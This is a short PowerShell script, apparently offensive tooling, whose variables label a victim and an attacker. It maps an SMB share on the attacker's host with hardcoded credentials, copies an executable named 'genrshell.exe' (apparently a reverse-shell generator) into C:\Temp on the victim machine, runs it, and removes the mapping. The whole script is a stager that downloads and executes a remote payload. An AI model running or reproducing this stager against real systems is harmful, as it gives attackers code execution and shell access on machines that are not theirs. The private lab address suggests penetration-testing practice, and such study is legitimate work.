$victimDisk = "X"
$powershellGeneratorExeFilename = "genrshell.exe"
$victimFolderPath = "C:\Temp"
$attackerAddress = "192.168.56.101"
$smbShare = "ksv"
$smbUser = "test"
$smbPassword = "gggg"


$user = $smbUser
$pass = ConvertTo-SecureString $smbPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
if (Get-PSDrive -Name $victimDisk -ErrorAction SilentlyContinue) {
    Remove-PSDrive -Name $victimDisk
}
New-PSDrive -Name $victimDisk -PSProvider FileSystem -Root "\\$attackerAddress\$smbShare" -Credential $cred -Persist *> $null
if (Test-Path $victimFolderPath) {
    Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $victimFolderPath
} else {
    New-Item -ItemType Directory -Path $victimFolderPath -Force
    Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $victimFolderPath
}
& "$victimFolderPath\$powershellGeneratorExeFilename"
Remove-PSDrive -Name $victimDisk
Exit